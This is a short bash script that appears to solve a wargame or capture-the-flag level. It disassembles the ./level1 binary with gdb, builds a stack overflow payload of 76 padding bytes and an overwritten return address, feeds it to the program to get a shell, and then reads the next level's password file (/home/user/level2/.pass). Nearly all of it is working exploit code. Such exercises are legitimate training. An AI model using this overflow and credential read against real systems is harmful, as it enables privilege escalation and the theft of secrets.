#!/bin/bash

OVERFLOW=`perl -e 'print "a" x 76 . "\x44\x84\x04\x08"' 2> /dev/null`
GETPASS="cat /home/user/level2/.pass"

set -x

gdb -q ./level1 << EOI
    info functions
    disas run
    x/s 0x8048584
    quit
EOI

echo $OVERFLOW > /tmp/buffer

(cat /tmp/buffer - | ./level1) << EOI
    echo "\nid: \$(id)"
    echo "Next pass is: \$($GETPASS)\n"
EOI
